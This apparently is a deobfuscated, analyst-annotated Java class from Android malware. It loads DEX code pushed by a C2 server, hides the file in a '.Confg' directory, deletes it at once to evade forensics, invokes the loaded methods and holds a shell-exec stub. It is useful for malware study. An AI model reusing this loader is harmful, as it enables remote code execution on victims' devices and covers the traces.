package com.android.pictach;

import android.app.ActivityManager;
import android.content.Context;
import android.os.Environment;
import dalvik.system.DexClassLoader;
import java.io.File;
import java.io.FileOutputStream;
import java.util.Iterator;

/**
 * LoveApi0 — Dynamic DEX module loader and service checker.
 *
 * Three core responsibilities:
 *
 * 1. isServiceNotRunning() — checks if a given Service class is currently running.
 *    Returns TRUE if NOT running, FALSE if already running.
 *    Used before starting services to avoid duplicates.
 *
 * 2. loadDexModule() — writes DEX bytes received from C2 to disk,
 *    loads the class via DexClassLoader, deletes the file immediately.
 *    This is the plugin/module system — C2 pushes arbitrary code.
 *
 * 3. invokeModuleMethod() — invokes a specific method on a previously
 *    loaded module class, passing C2 data as arguments.
 *
 * 4. runShellOnModuleDir() — runs a shell command on the module directory.
 *    Dead code in practice (What_LoveApi0_Run always returns null).
 */
public class LoveApi0 {

    // Counter used to generate unique temp DEX filenames (sysinfo0, sysinfo1, ...)
    public static int dexFileCounter;

    /**
     * Checks if a Service class is NOT currently running.
     * Returns TRUE  = service is NOT running (safe to start).
     * Returns FALSE = service IS running (already active).
     *
     * Original obfuscated name: m580x9bd83482 / illacarterithomson...h49
     */
    public static boolean isServiceNotRunning(Class<?> serviceClass, Context context) {
        Iterator<ActivityManager.RunningServiceInfo> it =
                ((ActivityManager) context.getSystemService("activity"))
                        .getRunningServices(Integer.MAX_VALUE)
                        .iterator();
        while (it.hasNext()) {
            if (serviceClass.getName().equals(it.next().service.getClassName())) {
                return false; // service IS running
            }
        }
        return true; // service is NOT running
    }

    /**
     * Returns the storage directory where temp DEX files are written.
     * Path: /sdcard/.Confg/  (if external storage available)
     *   or: /data/.Confg/    (fallback to internal)
     *
     * Config.FTX0 = ".Confg" (directory name)
     *
     * Original obfuscated name: m579x400c4888 / homeyshown...m32
     */
    public static File getModuleStorageDir(Context context) {
        if (Environment.getExternalStorageState() == null) {
            return new File(Environment.getDataDirectory(), Config.FTX0);
        }
        return new File(Environment.getExternalStorageDirectory(), Config.FTX0);
    }

    /**
     * Loads a DEX module sent by the C2 server.
     *
     * Parameters (passed as Object[] to avoid reflection detection):
     *   objArr[0] = Context
     *   objArr[1] = byte[]  — raw DEX bytes received from C2
     *   objArr[2] = String  — fully qualified class name to load
     *   objArr[3] = String  — optimization directory name
     *
     * Steps:
     *   1. Create /sdcard/.Confg/ if not exists
     *   2. Write DEX bytes to /sdcard/.Confg/sysinfo{N}  (Config.FTX3 + counter)
     *   3. DexClassLoader loads the class from that file
     *   4. File deleted immediately (anti-forensics — no trace on disk)
     *   5. Return the loaded Class object
     *
     * Original obfuscated name: m581x29590874 / mentionnvalleysbu...m29
     */
    public static synchronized Class<?> loadDexModule(Object[] objArr) {
        File dexFile;
        synchronized (LoveApi0.class) {
            Context context   = (Context) objArr[0];
            byte[] dexBytes   = (byte[])  objArr[1];
            // Remove "STOP" suffix that was appended as obfuscation marker
            String className  = ((String)  objArr[2]) + "STOP";
            // Remove "XTYVCX" suffix appended as obfuscation marker
            String optDirName = ((String)  objArr[3]) + "XTYVCX";

            File storageDir = getModuleStorageDir(context);
            if (!storageDir.exists()) {
                storageDir.mkdir();
            }

            // Write DEX bytes to temp file: /sdcard/.Confg/sysinfo0 (then 1, 2, ...)
            try {
                dexFile = new File(storageDir, buildTempFileName(Config.FTX3, "$$", dexFileCounter));
                dexFileCounter++;
                FileOutputStream fos = new FileOutputStream(dexFile);
                fos.write(dexBytes, 0, dexBytes.length);
                fos.flush();
                fos.close();
            } catch (Exception unused) {
                dexFile = null;
            }

            if (dexFile != null) {
                try {
                    // Load the class from the temp DEX file
                    DexClassLoader loader = new DexClassLoader(
                            dexFile.getPath(),
                            context.getDir(optDirName.replace("XTYVCX", ""), 0).getAbsolutePath(),
                            null,
                            context.getClass().getClassLoader()
                    );
                    // Delete immediately — no trace left on disk
                    dexFile.delete();
                    // Load and return the class (strips "STOP" suffix)
                    return loader.loadClass(className.replace("STOP", ""));
                } catch (Exception unused2) {
                }
            }
            return null;
        }
    }

    /**
     * Builds a unique temp filename for the DEX file.
     * "$$" marker length <= 2, so: returns (prefix + counter + "$$").replace("$$","")
     * Result: "sysinfo0", "sysinfo1", "sysinfo2", ...
     *
     * If marker length > 2: returns prefix + counter (no suffix).
     *
     * Original obfuscated name: Concatet
     */
    private static String buildTempFileName(String prefix, String marker, int counter) {
        if (marker.length() > 2) {
            return prefix + counter;
        }
        return (prefix + counter + marker).replace("$$", "");
    }

    /**
     * Invokes a method on a previously loaded DEX module class.
     *
     * Parameters (passed as Object[] to avoid reflection detection):
     *   objArr[0] = Context
     *   objArr[1] = Class   — the loaded module class (from loadDexModule)
     *   objArr[2] = String  — method name to invoke
     *   objArr[3] = String  — String argument to pass to the method
     *   objArr[4] = byte[]  — byte[] argument to pass to the method
     *
     * Auth guard: str parameter must equal the Unicode token "ʼʾʿˈᵔঙʿ$ʿʼ"
     *             This prevents accidental invocation.
     *
     * Method signature expected: returnType methodName(Context, String, byte[])
     *
     * "FB0TS" and "XXTB" suffixes are obfuscation markers stripped before use.
     *
     * Original obfuscated name: m578x9bdcd029 / ethicalnpromoted...n30
     */
    public static Object invokeModuleMethod(String authToken, Object[] objArr) {
        Context context    = (Context) objArr[0];
        Class   moduleClass = (Class)   objArr[1];
        // Strip "FB0TS" obfuscation suffix from method name
        String methodName  = ((String)  objArr[2]) + "FB0TS";
        // Strip "XXTB" obfuscation suffix from argument
        String strArg      = ((String)  objArr[3]) + "XXTB";
        byte[] dataArg     = (byte[])   objArr[4];

        // Auth check: only proceed if correct Unicode token passed
        if (moduleClass != null && authToken.equals("ʼʾʿˈᵔঙʿ$ʿʼ")) {
            try {
                return moduleClass
                        .getDeclaredMethod(
                                methodName.replace("FB0TS", ""),
                                Context.class,
                                String.class,
                                byte[].class
                        )
                        .invoke(
                                moduleClass.newInstance(),
                                context,
                                strArg.replace("XXTB", ""),
                                dataArg
                        );
            } catch (Exception unused) {
            }
        }
        return null;
    }

    /**
     * Runs a shell command on the module storage directory.
     * DEAD CODE in practice — What_LoveApi0_Run always returns null,
     * so exec() is never actually called.
     *
     * Original obfuscated name: m577xab0a3370 / displayswpromised...x31
     */
    public static void runShellOnModuleDir(Object[] objArr) {
        Context context = (Context) objArr[0];
        String  command = (String)  objArr[1];
        File    dir     = getModuleStorageDir(context);
        if (dir.isDirectory()) {
            try {
                Runtime rt = getRuntime("EXBbFT$");
                if (rt != null) {
                    rt.exec(command + dir.getPath());
                }
            } catch (Exception unused) {
            }
        }
    }

    /**
     * Dead code — always returns null regardless of input.
     * "EXBbFT$".length() > 0 is true, but Runtime.getRuntime() result
     * is discarded and null returned. Obfuscation dead end.
     *
     * Original obfuscated name: What_LoveApi0_Run
     */
    private static Runtime getRuntime(String str) {
        try {
            if (str.length() <= 0) {
                return null;
            }
            Runtime.getRuntime(); // result discarded
            return null;
        } catch (Exception unused) {
            return null;
        }
    }
}
